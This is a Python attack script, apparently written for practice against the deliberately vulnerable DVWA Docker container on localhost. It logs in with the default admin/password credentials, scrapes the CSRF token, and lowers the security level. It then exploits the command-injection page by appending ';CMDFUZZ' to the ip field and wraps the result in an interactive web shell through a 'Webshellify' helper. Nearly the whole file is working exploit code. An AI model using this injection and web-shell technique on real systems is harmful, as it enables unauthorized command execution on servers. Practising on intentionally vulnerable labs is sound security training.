#!/bin/python3
from webshellify import Webshellify

import requests as req
import re

"""
This script is make to work with docker container "vulnerables/web-dvwa". It
requires a valid, authorized PHPSSID cookie to be passed into it (either hard
coded or programatically fetched)
"""
def main():
    shell = Webshellify("localhost", "vulnerabilities/exec/#")
    shell.set_cookie("PHPSESSID", get_session())

    shell.set_cookie("security", "low")

    shell.set_method("POST")
    shell.set_header("Content-Type", "application/x-www-form-urlencoded")
    shell.set_body("ip=;CMDFUZZ&Submit=Submit")

    shell.create_shell(urlencode=True)

def get_session():
    resp = req.request("GET", "http://localhost/login.php")
    user_token_regex = re.compile("<input.*name=['\"]user_token['\"].*value=['\"](.*)['\"].*>")
    user_token = user_token_regex.findall(resp.text)[0]
    sess_cookie = resp.cookies.get("PHPSESSID")

    print(f"[info] aquired token: {user_token}")
    print(f"[info] aquired cookie: {sess_cookie}")

    resp2 = req.request(
        "POST",
        "http://localhost/login.php",
        data=f"username=admin&password=password&Login=Login&user_token={user_token}",
        headers={
            "Content-Type": "application/x-www-form-urlencoded"
        },
        cookies={
            "PHPSESSID": sess_cookie
        }
    )

    return sess_cookie

if __name__ == "__main__":
    main()
